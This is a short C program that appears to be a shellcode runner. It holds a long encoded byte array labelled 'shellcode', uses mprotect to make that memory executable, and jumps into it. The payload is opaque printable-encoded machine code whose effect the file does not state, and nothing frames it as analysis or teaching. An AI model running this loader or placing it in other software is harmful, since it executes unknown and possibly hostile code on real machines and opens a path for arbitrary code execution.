#include <sys/mman.h>
#include <stdio.h>
#include <stdint.h>

unsigned char shellcode[] = "\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x3f\x70\x34\x52\x21\x30\x5f\x52\x23\x30\x53\x55\x3f\x40\x53\x52\x3f\x60\x53\x52\x40\x50\x43\x52\x3a\x30\x4d\x52\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x44\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x65\x54\x63\x57\x21\x30\x4d\x52\x47\x41\x33\x59\x30\x50\x34\x52\x7a\x60\x44\x52\x66\x60\x46\x52\x2d\x60\x46\x52\x76\x74\x4f\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x78\x34\x33\x50\x21\x30\x47\x45\x40\x60\x34\x42\x4e\x60\x46\x52\x36\x74\x47\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x5a\x60\x44\x52\x36\x74\x47\x50\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x21\x30\x57\x55\x75\x34\x33\x50\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x75\x34\x33\x50\x21\x30\x47\x55\x38\x74\x57\x50\x21\x30\x57\x55\x78\x34\x33\x50\x21\x30\x47\x45\x38\x74\x57\x40\x38\x74\x57\x50\x74\x64\x37\x50\x38\x64\x56\x50\x38\x64\x56\x50\x74\x34\x58\x50\x32\x30\x60\x4f\x21\x30\x34\x42\x21\x30\x57\x55\x3f\x30\x53\x52\x26\x30\x30\x4a\x63\x37\x34\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x65\x3a\x33\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x65\x3d\x33\x50\x38\x74\x57\x50\x21\x50\x57\x55\x3f\x50\x55\x52\x35\x34\x33\x50\x38\x74\x57\x50\x21\x30\x46\x55\x63\x34\x24\x50\x22\x30\x46\x55\x63\x34\x24\x50\x23\x30\x46\x55\x38\x64\x56\x50\x38\x64\x56\x50\x38\x64\x56\x50\x2a\x30\x30\x5a\x32\x30\x60\x4f\x3f\x3f\x3f\x5f\x77\x3f\x6f\x3f\x62\x7d\x47\x40\x43\x41\x46\x5f\x3f\x61\x3f\x61\x77\x3f\x6c\x6f\x67\x4d\x4b\x3f\x3f\x3f\x42\x6e\x4a\x75\x48\x68\x5a\x61\x7c\x72\x59\x3f\x41\x4f\x26";

int main() {
    uintptr_t addr=(uintptr_t)shellcode;
    uintptr_t pagestart  =  addr & ~4095;

    mprotect((void *)pagestart, 16384, PROT_READ | PROT_WRITE | PROT_EXEC);
    (*(void (*)())shellcode)();
    return 0;
}
